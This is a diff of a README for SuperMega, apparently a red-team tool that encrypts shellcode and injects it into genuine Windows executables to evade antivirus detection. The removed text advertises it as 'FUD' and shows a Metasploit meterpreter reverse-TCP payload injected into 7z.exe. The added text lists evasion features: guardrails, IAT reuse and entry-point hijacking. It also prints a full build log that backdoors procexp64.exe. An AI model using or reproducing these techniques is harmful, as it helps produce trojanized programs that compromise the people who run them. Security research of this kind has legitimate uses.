@@ -8,78 +8,70 @@
 
 ## What
 
-SuperMega is a shellcode loader. It will take a shellcode as input, protects it, adds a loader,
-and injects the resulting shellcode into an exe. 
+SuperMega is a shellcode loader by injecting it into genuine executables (.exe or .dll).
+The loader is programmed in C. 
 
-FUD.
+The idea is that injecting shellcode nicely into a non-malicious executable should make
+it less detected.
 
-And: 
-* Only works with 64 bit (shellcode and infecteble exe's)
+Features:
+* Encrypt payload
+* Execution guardrails, so payload is only decrypted on target
+* Keep all original properties of the executable (imports etc.)
+* Very small carrier loader
+* Code execution either through Entry Point modification, or ASM function hijacking
+* Patches carrier shellcode so it re-uses the original IAT (IAT-reuse, no peb-walk)
+* Patch IAT for missing functions for the carrier
 
-Features: 
-* Loader source is C yay
-* Execution-Guardrails
-  * Environment variables
-* configurable implementation
-* different EXE injection techniques
-
-Plugins: 
-* source style:
-  * PEB_WALK
-  * IAT_REUSE
-* alloc style:
-  * RWX
-  * REUSE_RWX
-* decoder style:
-  * PLAIN_1
-  * XOR_1
-* dataref style:
-  * APPEND
 
 
 ## Examples
 
-### Metasploit in 7z
-
-Inject metasploit into 7z.exe. It will use PEB_WALK. 
+Inject `messagebox.bin` shellcode into `procexp64.exe` executable:
 
 ```
-PS C:\repos\supermega> python.exe .\supermega.py --shellcode .\shellcodes\msf-meterpreter-reversetcp.bin --inject .\exes\7z.exe
-(supermega.py) Super Mega
-(helper.py   ) --[ Remove old files ]
-(model.py    ) --( Capabilities: 
-(model.py    )   0x0: GetEnvironmentVariableW (b'')
-(model.py    )   0x460090: VirtualAlloc (b'')
-(supermega.py) --[ SourceStyle: peb_walk
-(compiler.py ) --[ C to ASM: build\main.c -> build\main.asm ]
-(compiler.py ) ---[ Make ASM from C: build\main.c ]
-(compiler.py ) ---[ Fixup  : build\main.asm ]
-(compiler.py )     > Replace external reference at line: 8
-(compiler.py )     > Replace external reference at line: 395
-(compiler.py )     > Replace payload length at line: 389
-(compiler.py )     > Add end of code label at line: 807
-(compiler.py ) ---[ Cleanup: build\main.asm ]
-(assembler.py) --[ Assemble to exe: build\main.asm -> build\main.exe -> build\main.bin ]
-(assembler.py) ---[ Assemble ASM to EXE: build\main.asm -> build\main.exe ]
-(assembler.py) ---[ EXE to SHC: build\main.exe -> build\main.bin ]
-(helper.py   ) --[ Code section: .text
-(helper.py   )     > 0x1000 Code Size: 2557  (raw code section size: 2560)
-(assembler.py) --[ Merge stager: build\main.bin + .\shellcodes\msf-meterpreter-reversetcp.bin -> build\main.bin ]
-(assembler.py) ---[ Size: Stager: 2557 and Payload: 449  Sum: 3006 ]
-(injector.py ) --[ Injecting: build\main.bin into: .\exes\7z.exe -> .\exes\7z.infected.exe ]
-(supermega.py) --[ Start infected exe ]
+(project.py  ) Copy data/source/carrier/iat_reuse/template.c to projects/default/
+(payload.py  ) --( Load payload: data/binary/shellcodes/messagebox.bin
+(exehost.py  ) --[ Analyzing: data/binary/exes/procexp64.exe
+(exehost.py  ) ---[ Injectable: Chosen code section: .text at 0x1000 size: 1159374
+(supermega.py) --I FunctionInvokeStyle: iat_reuse  Inject Mode: hijack branching instruction in entrypoint  DecoderStyle: xor_1
+(templater.py) --[ Create C from template
+(compiler.py ) --[ Compile C to ASM: projects/Verify_1/main.c -> projects/Verify_1/main.asm 
+(helper.py   ) --[ Run process: C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.37.32822\bin\Hostx64\x64\cl.exe /c /FA /GS- /Faprojects/Verify_1/ projects/Verify_1/main.c
+(assembler.py) --[ Assemble to exe: projects/Verify_1/main.asm -> projects/Verify_1/main.exe -> projects/Verify_1/main.bin
+(helper.py   ) --[ Run process: C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.37.32822\bin\Hostx64\x64\ml64.exe projects/Verify_1/main.asm /link /OUT:projects/Verify_1/main.exe /entry:AlignRSP
+(assembler.py) --[ Merge stager with payload -> projects/Verify_1/main.bin
+(assembler.py) ---[ XOR payload with key 0x31
+(assembler.py) ---[ Size: Stager: 554 and Payload: 433  Sum: 987 
+(injector.py ) --[ Injecting: data/binary/shellcodes/messagebox.bin into data/binary/exes/procexp64.exe -> projects/Verify_1/procexp64.infected.exe
+(injector.py ) --( Inject: Shellcode rva:0x8E679 (from offset:0x8DA79)
+(injector.py ) ---( Rewire: EXE
+(injector.py ) --( Inject EXE: Patch from entrypoint (0xE1D78)
+(derbackdoorer.py) Backdooring function at 0xE1D78 (to shellcode 0x8E679)
+(derbackdoorer.py) find suitable instr to hijack: off: from 0xE1D78 len:256 depthopt:DEPTH_OPTIONS.LEVEL1
+(derbackdoorer.py) 	[000e1d78]	48 83 ec 28            sub	rsp, 0x28
+(derbackdoorer.py) 	[000e1d7c]	e8 2f 04 00 00         call	0xe21b0
+(derbackdoorer.py) --[ Backdoor 0xE1D7C: MOV RDX, 0x14008E679 ; CALL RDX
+(superpe.py  ) Adding 1 relocations for Page RVA 0xE1000 - size of block: 0xA
+(superpe.py  ) 	Reloc0 for addr 0xE1D7E: 0xAD7E - 0xD7E - type: 10
+(injector.py )     Replace 139cafc9f30d at VA 0x14008E73A with call to IAT at VA 0x14011D848
+(injector.py )     Replace 9a16256e76f8 at VA 0x14008E785 with call to IAT at VA 0x14011D958
+(injector.py )     Replace 0c2c5edbf8b5 at VA 0x14008E800 with call to IAT at VA 0x14011DBE8
+(injector.py )     Add data to .rdata at 0x1401204A9 (off: 1174185): USERPROFILE
+(injector.py )     Add data to .rdata at 0x1401206A9 (off: 1174697): C:\Users\hacker
+(injector.py )     Replace 46c4ab596ed89c at VA 0x14008E6FD with LEA rcx .rdata 0x1401204A9
+(injector.py )     Replace 2c305aac9e56ab at VA 0x14008E716 with LEA rcx .rdata 0x1401206A9
 ```
 
 
 ## Directories
 
-* `shellcodes/`: Input: Shellcodes we want to use as input (payload)
-* `source/`: Input: Loader C templates
-* `plugins/`: Input: Loader C implementations
-* `exes/`: Input: Nonmalicious EXE files we inject into
-* `build/`: build: Temporary files during build process
-* `logs/`: build: Files generated by building (inspect for debugging)
-* `out/`: output. The generated result: infected exe
+* `data/binary/shellcodes`: Input: Shellcodes we want to use as input (payload)
+* `data/binary/exes/`: Input: Nonmalicious EXE files we inject into
+* `data/source/carrier`: Input: Carrier C templates
+* `projects/<projectname>`: output: Project directory with all files
+* `projects/default`: output: Project directory with all files
+
 
 ## Installation
 
